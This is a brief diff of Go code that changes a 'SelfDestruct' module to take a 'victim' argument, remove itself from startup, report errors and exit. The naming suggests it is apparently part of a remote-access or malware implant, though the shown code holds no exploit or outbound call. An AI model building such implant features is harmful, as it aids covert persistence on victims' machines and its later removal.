@@ -8,13 +8,12 @@ import (
 type SelfDestruct struct {
 }
 
-func (s SelfDestruct) Start() {
+func (s SelfDestruct) Run(victim string) {
 	err := utils.RemoveFromStartup()
 	if err != nil {
+		utils.HandleError("Error self destructing", victim)
 		fmt.Println("Error self destructing")
 		return
 	}
 	panic("Goodbye")
 }
-
-func (s SelfDestruct) Communicate(_ string) {}
